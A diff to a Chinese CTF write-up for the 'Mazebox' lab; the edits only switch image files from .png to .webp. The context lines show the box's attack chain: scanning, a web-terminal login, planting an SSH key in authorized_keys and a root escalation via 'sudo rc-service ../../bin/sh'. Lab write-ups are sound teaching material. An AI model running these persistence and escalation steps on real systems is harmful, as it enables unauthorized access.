@@ -11,7 +11,7 @@
 | 凭据 | `lingmj` / `dphjwsk[bug]snd` |
 | 最终路径 | 首页谜题拼口令 → `/supersecretbackend` 登录 → SSH 公钥 → `sudo rc-service` 任意路径脚本 → root |
 
-![环境 / 启动](/content/mazebox/image-01.png)
+![环境 / 启动](/content/mazebox/image-01.webp)
 
 ## 1. 攻击链概览
 
@@ -41,7 +41,7 @@ nmap -sT -sV -sC -O -p- 192.168.134.71
 
 首页源码 / 页面右侧三行提示：
 
-![首页源码线索](/content/mazebox/image-02.png)
+![首页源码线索](/content/mazebox/image-02.webp)
 
 ```text
 "Welcome to MazeSec"
@@ -87,7 +87,7 @@ dirsearch -u http://192.168.134.71:80
 | `/top` | 跑 `top`——**进程列表自泄露**完整 `-s` |
 | `/supersecretbackend` | `LOGIN`：系统登录框 → lingmj shell |
 
-![/top 暴露路由](/content/mazebox/image-03.png)
+![/top 暴露路由](/content/mazebox/image-03.webp)
 
 ### 踩坑：目录爆破为什么打不到 `/top`
 
@@ -103,7 +103,7 @@ shellinaboxd 把 **URL 路径当服务路由**，不是文件系统。未匹配�
 
 浏览器打开 `http://192.168.134.71:4200/supersecretbackend`：
 
-![Web 终端登录 lingmj](/content/mazebox/image-05.png)
+![Web 终端登录 lingmj](/content/mazebox/image-05.webp)
 
 ```text
 Mazebox login: lingmj
@@ -112,7 +112,7 @@ lingmj@Mazebox:~$ cat user.txt
 flag{user-bd05572a9b360476ad73c022f66449ed}
 ```
 
-![user flag](/content/mazebox/image-06.png)
+![user flag](/content/mazebox/image-06.webp)
 
 SSH 密码登录是死路。进盒子后写公钥，再转密钥会话：
 
@@ -121,7 +121,7 @@ mkdir -p ~/.ssh
 echo 'ssh-ed25519 AAAA... kali@kali' > ~/.ssh/authorized_keys
 ```
 
-![SSH 公钥登录](/content/mazebox/image-07.png)
+![SSH 公钥登录](/content/mazebox/image-07.webp)
 
 ## 5. 提权：`rc-service` 滥用
 
@@ -129,7 +129,7 @@ echo 'ssh-ed25519 AAAA... kali@kali' > ~/.ssh/authorized_keys
 sudo -l
 ```
 
-![sudo -l](/content/mazebox/image-08.png)
+![sudo -l](/content/mazebox/image-08.webp)
 
 ```text
 User lingmj may run the following commands on Mazebox:
@@ -144,7 +144,7 @@ User lingmj may run the following commands on Mazebox:
 sudo /sbin/rc-service ../../bin/sh
 ```
 
-![rc-service 提权](/content/mazebox/image-09.png)
+![rc-service 提权](/content/mazebox/image-09.webp)
 
 ```text
 root@Mazebox:/home/lingmj# id
